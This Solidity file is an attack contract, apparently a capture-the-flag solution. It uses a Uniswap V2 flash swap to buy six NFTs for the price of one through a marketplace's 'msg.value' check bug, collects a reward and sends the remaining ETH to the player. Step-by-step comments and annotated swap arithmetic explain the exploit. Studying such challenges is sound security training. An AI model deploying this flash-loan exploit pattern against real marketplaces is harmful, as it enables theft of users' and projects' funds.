// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IMarket {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IERC721 {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
    function ownerOf(uint256 tokenId) external view returns (address owner);
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Attacker10 is IUniswapV2Callee, IERC721Receiver {
    uint256[] tokenIds;
    address market;
    address dev;
    address pair;
    address weth;
    address nft;
    address player;

    constructor(address market_, address dev_, address nft_, uint256[] memory tokenIds_, address pair_, address weth_) {
        market = market_;
        dev = dev_;
        nft = nft_;
        tokenIds = tokenIds_;
        pair = pair_;
        weth = weth_;
        player = msg.sender;
    }

    function attack() external payable {
        // 0. Call swap with the 15ETH and a mock calldata "0x01", this 15ETH will be transfered to this contract for an instant.
        // It acts like flash-loan called flash-swap.
        IUniswapV2Pair(pair).swap(15 ether, 0, address(this), "0x01");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        // 1. Unwrap ETH
        IWETH(weth).withdraw(amount0);

        // 2. With only 15 ETH, it is possible to purchase six tokens, each valued at 15 ETH.
        // Acctually, it must be 90 ETH. It is because of the bug at `msg.value < priceToPay`.
        IMarket(market).buyMany{value: 15 ether}(tokenIds);

        // 3. Transfer all of tokens to the Dev Contract to receive the reward.
        bytes memory a = abi.encode(address(this));
        for (uint i = 0; i < tokenIds.length; i++) {
            IERC721(nft).safeTransferFrom(address(this), dev, tokenIds[i], a);
        }

        // 4. After completing the flash-swap transaction, we need to wrap ETH in order to transfer it back to the Uniswap pair.
        IWETH(weth).deposit{value: amount0+0.5 ether}();

        // 5. Because UniswapV2 pairs collect fees on the transaction initiator, 
        // it is advisable to send a slightly larger amount of tokens than required, 
        // to avoid encountering the 'Uniswap: K' error.
        // This case 0.5ETH is enough.
        IWETH(weth).transfer(pair, amount0+0.5 ether);
    
        // 6. Once all of NFTs have been sent to the Dev Contract, send all of ETH to the player.
        payable(player).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {

    }

    /*
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT'); // amountOut == 90ETH
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');

        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this)); // balance0 = 9000, reserve0 = 9000, amount0Out = 90
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; // amount0In = 90
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3)); // (9000*1000) - (90*3) =  8,999,730
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3)); // (15000*1000) - (0*3) = 15,000,000
        // 8,999,730*15,000,000
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K'); 
        // 134,995,950,000,000
        //     270,000,000,000
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }
    */
    
}

